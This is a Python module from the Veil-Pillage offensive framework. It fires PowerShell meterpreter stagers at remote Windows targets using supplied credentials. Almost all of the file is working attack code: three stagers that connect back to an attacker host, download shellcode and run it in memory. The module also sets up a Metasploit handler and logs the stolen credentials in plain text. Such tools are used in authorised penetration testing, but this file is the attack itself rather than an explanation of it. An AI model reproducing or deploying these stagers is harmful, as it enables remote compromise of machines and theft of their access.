"""

Invokes a native meterpreter stager on a target, one of
reverse_tcp, reverse_http, or reverse_https

Cleanup-> kill-scripts

Module built by @harmj0y

"""

import sys, base64, re, time, os

from lib import helpers
from lib import messages
from lib import smb
from lib import command_methods
import settings


class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Powershell Stager"
        self.description = "Invoke a pure meterpreter stager on a target using powershell."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # holder for the argument dictionary passed by the main pillage.py
        # so we can parse command line arguments as necessary
        self.args = args

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method"   : ["wmis", "[wmis] or [winexe] for triggering"],
                                 "stager"           : ["rev_http", "[rev_tcp], [rev_http] or [rev_https]"],
                                 "spawn_handler"    : ["false", "spawn a meterpreter handler"],
                                 "lhost"            : ["", "lhost of the handler"],
                                 "lport"            : ["8080", "lport of the handler"]}

    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]
        stager = self.required_options["stager"][0]
        lhost = self.required_options["lhost"][0]
        lport = self.required_options["lport"][0]
        spawnHandler = self.required_options["spawn_handler"][0]

        # start building the handler in case we want to invoke it
        handler = "use exploit/multi/handler"

        # the pure powershell windows/meterpreter/reverse_tcp stager
        revTCPStager = """$c = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
"@
try{$s = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect('%s', %s) | out-null; $p = [Array]::CreateInstance("byte", 4); $x = $s.Receive($p) | out-null; $z = 0
$y = [Array]::CreateInstance("byte", [BitConverter]::ToInt32($p,0)+5); $y[0] = 0xBF
while ($z -lt [BitConverter]::ToInt32($p,0)) { $z += $s.Receive($y,$z+5,32,[System.Net.Sockets.SocketFlags]::None) }
for ($i=1; $i -le 4; $i++) {$y[$i] = [System.BitConverter]::GetBytes([int]$s.Handle)[$i-1]}
$t = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru; $x=$t::VirtualAlloc(0,$y.Length,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($y, 0, [IntPtr]($x.ToInt32()), $y.Length)
$t::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" %(lhost, lport)

        # the pure powershell windows/meterpreter/reverse_http stager
        revHTTPStager = """$q = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@
try{$d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
function c($v){ return (([int[]] $v.ToCharArray() | Measure-Object -Sum).Sum %% 0x100 -eq 92)}
function t {$f = "";1..3|foreach-object{$f+= $d[(get-random -maximum $d.Length)]};return $f;}
function e { process {[array]$x = $x + $_}; end {$x | sort-object {(new-object Random).next()}}}
function g{ for ($i=0;$i -lt 64;$i++){$h = t;$k = $d | e; foreach ($l in $k){$s = $h + $l; if (c($s)) { return $s }}}return "9vXU";}
$m = New-Object System.Net.WebClient;$m.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)")
$n = g; [Byte[]] $p = $m.DownloadData("http://%s:%s/$n" )
$o = Add-Type -memberDefinition $q -Name "Win32" -namespace Win32Functions -passthru
$x=$o::VirtualAlloc(0,$p.Length,0x3000,0x40);[System.Runtime.InteropServices.Marshal]::Copy($p, 0, [IntPtr]($x.ToInt32()), $p.Length)
$o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" %(lhost, lport)

        # the pure powershell windows/meterpreter/reverse_https stager
        revHTTPSStager = """$q = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@
try{$d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
function c($v){ return (([int[]] $v.ToCharArray() | Measure-Object -Sum).Sum %% 0x100 -eq 92)}
function t {$f = "";1..3|foreach-object{$f+= $d[(get-random -maximum $d.Length)]};return $f;}
function e { process {[array]$x = $x + $_}; end {$x | sort-object {(new-object Random).next()}}}
function g{ for ($i=0;$i -lt 64;$i++){$h = t;$k = $d | e;  foreach ($l in $k){$s = $h + $l; if (c($s)) { return $s }}}return "9vXU";}
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$m = New-Object System.Net.WebClient;
$m.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)");$n = g; [Byte[]] $p = $m.DownloadData("https://%s:%s/$n" )
$o = Add-Type -memberDefinition $q -Name "Win32" -namespace Win32Functions -passthru
$x=$o::VirtualAlloc(0,$p.Length,0x3000,0x40);[System.Runtime.InteropServices.Marshal]::Copy($p, 0, [IntPtr]($x.ToInt32()), $p.Length)
$o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" %(lhost, lport)

        # get the encoded powershell trigger command
        if stager.lower() == "rev_tcp":
            triggerCMD = helpers.encPowershell(revTCPStager)
            handler += "\nset PAYLOAD windows/meterpreter/reverse_tcp"
        elif stager.lower() == "rev_http":
            triggerCMD = helpers.encPowershell(revHTTPStager)
            handler += "\nset PAYLOAD windows/meterpreter/reverse_http"
        elif stager.lower() == "rev_https":
            triggerCMD = helpers.encPowershell(revHTTPSStager)
            handler += "\nset PAYLOAD windows/meterpreter/reverse_https"
        else:
            print helpers.color("\n [!] Stager not recognized: please enter rev_tcp, rev_http, or rev_https\n", warning=True)
            raw_input("\n [>] Press enter to continue: ")
            return ""

        # finish off the handler and write it to the tmp directory
        handler += "\nset LHOST " + lhost
        handler += "\nset LPORT " + lport
        handler += "\nset ExitOnSession false"
        handler += "\nexploit -j\n"
        f = open('/tmp/handler.rc', 'w')
        f.write(handler)
        f.close()

        # build and spawn a handler for the invoked payload
        if spawnHandler.lower() == "true":
            handlerPath = "/tmp/handler.rc"
            # command to spawn a new tab
            cmd = "gnome-terminal --tab -t \"Veil-Pillage Handler\" -x bash -c \"echo ' [*] Spawning Metasploit handler...' && msfconsole -r '" + handlerPath + "'\""
            # invoke msfconsole with the handler script in a new tab
            os.system(cmd)
            raw_input("\n\n [>] Press enter when handler is ready: ")

        # execute the powershell trigger command on each target
        for target in self.targets:

            # trigger the command and set output as appropriate
            print "\n [*] Triggering powershell stager '"+stager.lower()+"' with lhost="+lhost+" and lport="+lport+" on "+target
            self.output += "[*] Triggering powershell stager '"+stager.lower()+"' with lhost="+lhost+" and lport="+lport+" using creds '"+username+":"+password+"' on "+target+"\n"
            command_methods.executeCommand(target, username, password, triggerCMD, triggerMethod)

            # build our cleanup file -> kill all powershell processes
            killCMD = "taskkill /f /im powershell.exe"
            self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+killCMD+"|"+triggerMethod+"\n"
